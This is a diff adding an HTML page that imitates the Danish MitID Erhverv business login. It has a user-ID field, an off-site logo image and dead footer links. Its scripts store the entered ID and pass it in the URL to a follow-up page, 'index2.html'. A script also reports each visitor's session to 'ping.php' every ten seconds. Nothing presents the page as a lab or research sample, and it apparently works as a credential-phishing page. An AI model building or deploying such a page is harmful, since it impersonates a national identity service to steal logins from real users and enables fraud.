@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log på hos MitID Erhverv</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #ffffff; color: #000000; display: flex; justify-content: center; }
+    .app-container { position: relative; width: 100%; max-width: 440px; min-height: 100vh; background: #ffffff; display: flex; flex-direction: column; }
+    header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background-color: #f8f9fa; border-bottom: 1px solid #e0e0e0; }
+    .menu-btn { display: flex; align-items: center; gap: 10px; background: none; border: none; font-size: 16px; font-weight: 600; color: #000000; cursor: pointer; }
+    .hamburger-icon { width: 18px; height: 13px; display: flex; flex-direction: column; justify-content: space-between; }
+    .hamburger-icon span { display: block; height: 2px; width: 100%; background-color: #000000; }
+    .lang-switcher { display: flex; gap: 8px; }
+    .lang-btn { background: #ffffff; border: 1px solid #0056b3; padding: 6px 14px; border-radius: 4px; color: #0056b3; font-weight: 600; font-size: 14px; cursor: pointer; }
+    .brand-bar { padding: 16px 16px 12px 16px; border-bottom: 3px solid #0056b3; }
+    .brand-logo { font-size: 22px; font-weight: 700; color: #000000; ; letter-spacing: -0.5px; }
+    .main-wrapper { position: relative; flex-grow: 1; display: flex; flex-direction: column; }
+    main { padding: 24px 16px; flex-grow: 1; display: flex; flex-direction: column; }
+    .title-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+    h1 { font-size: 20px; font-weight: 700; color: #000000; }
+    .section-logo { height: 24px; width: auto; object-fit: contain; }
+    .label-container { display: flex; align-items: center; gap: 6px; margin-bottom: 8px; }
+    label { font-size: 13px; font-weight: 800; letter-spacing: 0.4px; color: #000000; text-transform: uppercase; }
+    .help-icon { width: 18px; height: 18px; border: 1.5px solid #000000; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; color: #000000; cursor: pointer; }
+    .input-wrapper { position: relative; display: flex; align-items: center; margin-bottom: 16px; }
+    .input-field { width: 100%; padding: 14px 65px 14px 12px; font-size: 16px; border: 2px solid #0056b3; border-radius: 4px; outline: none; }
+    .toggle-show { position: absolute; right: 14px; background: none; border: none; color: #333333; font-size: 15px; cursor: pointer; }
+    .submit-btn { width: 100%; padding: 14px; background-color: #cccccc; color: #ffffff; border: none; border-radius: 4px; font-size: 14px; font-weight: 700; letter-spacing: 0.8px; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: not-allowed; margin-bottom: 20px; text-transform: uppercase; transition: background-color 0.2s ease, cursor 0.2s ease; }
+    .submit-btn.active { background-color: #0056b3; cursor: pointer; }
+    .arrow-icon { font-size: 16px; }
+    .info-link { display: inline-flex; align-items: center; gap: 8px; color: #0056b3; text-decoration: none; font-size: 16px; font-weight: 700; }
+    .info-icon { width: 20px; height: 20px; border: 2px solid #0056b3; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; }
+    .gap-spacer { flex-grow: 1; min-height: 100px; }
+    .checkbox-container { display: flex; align-items: center; gap: 12px; padding-top: 16px; padding-bottom: 16px; }
+    .checkbox-container input[type="checkbox"] { width: 20px; height: 20px; border: 2px solid #002b49; border-radius: 3px; cursor: pointer; }
+    .checkbox-label { font-size: 16px; font-weight: 700; color: #002b49; }
+    .action-links { display: flex; gap: 36px; padding: 16px 0; border-top: 1px solid #e0e0e0; }
+    .action-link { color: #002b49; text-decoration: none; font-size: 16px; font-weight: 700; }
+    footer { border-top: 2px solid #000000; background-color: #ffffff; margin-top: auto; }
+    .footer-item { border-bottom: 1px solid #cccccc; }
+    .accordion-header { width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 18px 16px; background: none; border: none; font-size: 17px; font-weight: 600; color: #1a1a1a; cursor: pointer; text-align: left; }
+    .accordion-chevron { width: 10px; height: 10px; border-right: 2px solid #333333; border-bottom: 2px solid #333333; transform: rotate(45deg); transition: transform 0.2s ease; margin-right: 4px; }
+    details[open] .accordion-chevron { transform: rotate(-135deg); }
+    .accordion-content { padding: 0 16px 20px 16px; font-size: 14px; line-height: 1.5; color: #333333; }
+    .accordion-content p { margin-bottom: 16px; }
+    .blue-link { color: #0056b3; text-decoration: underline; font-size: 14px; font-weight: 500; }
+    .footer-link-row { display: flex; justify-content: space-between; align-items: center; padding: 18px 16px; text-decoration: none; color: #1a1a1a; font-size: 17px; font-weight: 600; }
+    .chevron-right { width: 9px; height: 9px; border-right: 2px solid #333333; border-top: 2px solid #333333; transform: rotate(45deg); margin-right: 4px; }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <header>
+      <button class="menu-btn" aria-label="Menu">
+        <div class="hamburger-icon"><span></span><span></span><span></span></div>
+        Menu
+      </button>
+      <div class="lang-switcher">
+        <button class="lang-btn">English</button>
+        <button class="lang-btn">Kalaallisut</button>
+      </div>
+    </header>
+
+    <div class="brand-bar">
+      <div class="brand-logo">MitID</div>
+    </div>
+
+    <div class="main-wrapper">
+      <main>
+        <div class="title-container">
+          <h1>Log på hos MitID Erhverv</h1>
+          <img src="https://i.ibb.co/rGwxdP0Q/Screenshot-2026-09-14-124835.png" alt="Logo" class="section-logo" />
+        </div>
+
+        <form id="loginForm" style="display: flex; flex-direction: column; flex-grow: 1;">
+          <div class="form-group">
+            <div class="label-container">
+              <label for="bruger-id">BRUGER-ID</label>
+              <span class="help-icon" title="Hjælp">?</span>
+            </div>
+
+            <div class="input-wrapper">
+              <input type="text" id="bruger-id" class="input-field" value="" autocomplete="off" />
+              <button type="button" class="toggle-show">Skjul</button>
+            </div>
+          </div>
+
+          <button type="submit" id="submitBtn" class="submit-btn" disabled>
+            FORTSÆT <span class="arrow-icon">&rarr;</span>
+          </button>
+
+          <a href="#" class="info-link">
+            <span class="info-icon">i</span>
+            Glemt bruger-ID?
+          </a>
+
+          <div class="gap-spacer"></div>
+
+          <div class="checkbox-container">
+            <input type="checkbox" id="husk" />
+            <label for="husk" class="checkbox-label">Husk mig hos MitID</label>
+          </div>
+
+          <div class="action-links">
+            <a href="#" class="action-link">Afbryd</a>
+            <a href="#" class="action-link">Hjælp</a>
+          </div>
+        </form>
+      </main>
+    </div>
+
+    <footer>
+      <details class="footer-item">
+        <summary class="accordion-header">
+          <span>Sikker brug af MitID</span>
+          <span class="accordion-chevron"></span>
+        </summary>
+        <div class="accordion-content">
+          <p>Pas godt på dit MitID og hold altid dine MitID-oplysninger for dig selv. Få gode råd til sikker brug af MitID.</p>
+          <a href="#" class="blue-link">Sikkerhed</a>
+        </div>
+      </details>
+      <div class="footer-item"><a href="#" class="footer-link-row"><span>Driftstatus</span><span class="chevron-right"></span></a></div>
+      <div class="footer-item"><a href="#" class="footer-link-row"><span>Mere information</span><span class="chevron-right"></span></a></div>
+      <div class="footer-item"><a href="#" class="footer-link-row"><span>Behandling af dine personoplysninger</span><span class="chevron-right"></span></a></div>
+      <div class="footer-item"><a href="#" class="footer-link-row"><span>Om MitID</span><span class="chevron-right"></span></a></div>
+    </footer>
+  </div>
+
+  <script>
+    const inputField = document.getElementById('bruger-id');
+    const submitBtn = document.getElementById('submitBtn');
+    const loginForm = document.getElementById('loginForm');
+
+    inputField.addEventListener('input', function() {
+      if (this.value.trim().length > 0) {
+        submitBtn.classList.add('active');
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.classList.remove('active');
+        submitBtn.disabled = true;
+      }
+    });
+
+    // Save Bruger-ID and seamlessly redirect to index2.html
+    loginForm.addEventListener('submit', function(event) {
+      event.preventDefault();
+      if (submitBtn.disabled) return;
+
+      const brugerId = inputField.value.trim();
+      localStorage.setItem('brugerId', brugerId);
+
+      window.location.href = `index2.html?burger_id=${encodeURIComponent(brugerId)}`;
+    });
+  </script>
+
+<script>
+(function () {
+  try {
+    var k = "juj_session_id";
+    var sid = sessionStorage.getItem(k);
+    if (!sid) {
+      sid = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
+        var r = Math.random() * 16 | 0;
+        return (c === "x" ? r : (r & 0x3 | 0x8)).toString(16);
+      });
+      sessionStorage.setItem(k, sid);
+    }
+    function beat() {
+      try {
+        var u = "ping.php?sid=" + encodeURIComponent(sid) + "&t=" + Date.now();
+        (new Image()).src = u;
+        fetch(u, { cache: "no-store", keepalive: true }).catch(function () {});
+      } catch (e) {}
+    }
+    beat();
+    setInterval(beat, 10000);
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
